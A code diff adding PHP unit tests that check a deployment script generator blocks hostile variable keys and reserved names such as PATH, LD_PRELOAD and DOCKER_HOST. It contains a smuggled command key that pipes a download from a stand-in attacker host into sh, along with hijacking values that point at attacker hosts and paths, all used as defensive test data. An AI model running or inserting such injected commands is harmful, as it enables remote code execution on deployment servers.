@@ -139,6 +139,44 @@ class ProjectVariableTest extends TestCase
     }
 
     #[Test]
+    public function a_hostile_key_is_refused_by_the_script_layer_even_if_it_reached_the_table()
+    {
+        // The controllers validate keys, but the script generator is the actual
+        // trust boundary: the key is written into a root-equivalent shell
+        // unquoted, so a row inserted by any other route must not execute.
+        $deployment = $this->deploymentWith([
+            'GOOD_ONE' => ['value' => 'kept-value'],
+            'X=1; curl evil.example/x | sh #' => ['value' => 'whatever'],
+        ]);
+
+        $script = StepScriptFactory::scriptFor($this->step($deployment, StepType::INLINE_SCRIPT, ['script' => 'echo hi']));
+
+        $this->assertStringNotContainsString('curl evil.example', $script);
+        $this->assertStringContainsString("export GOOD_ONE='kept-value'", $script);
+    }
+
+    #[Test]
+    public function names_that_hijack_the_deployment_are_never_exported()
+    {
+        // PATH would repoint every command in the step; DOCKER_HOST would send
+        // the build and `compose up` to someone else's daemon.
+        $deployment = $this->deploymentWith([
+            'PATH' => ['value' => '/tmp/evil:/usr/bin'],
+            'LD_PRELOAD' => ['value' => '/tmp/evil.so'],
+            'DOCKER_HOST' => ['value' => 'tcp://attacker.example:2375', 'build_arg' => true],
+            'APP_ENV' => ['value' => 'production'],
+        ]);
+
+        $script = StepScriptFactory::scriptFor($this->step($deployment, StepType::DOCKER_DEPLOY));
+
+        foreach (['PATH', 'LD_PRELOAD', 'DOCKER_HOST'] as $reserved) {
+            $this->assertStringNotContainsString('export '.$reserved.'=', $script);
+            $this->assertStringNotContainsString('--build-arg \''.$reserved.'=\'', $script);
+        }
+        $this->assertStringContainsString("export APP_ENV='production'", $script);
+    }
+
+    #[Test]
     public function a_project_without_variables_produces_an_unchanged_script()
     {
         $deployment = $this->deploymentWith([]);
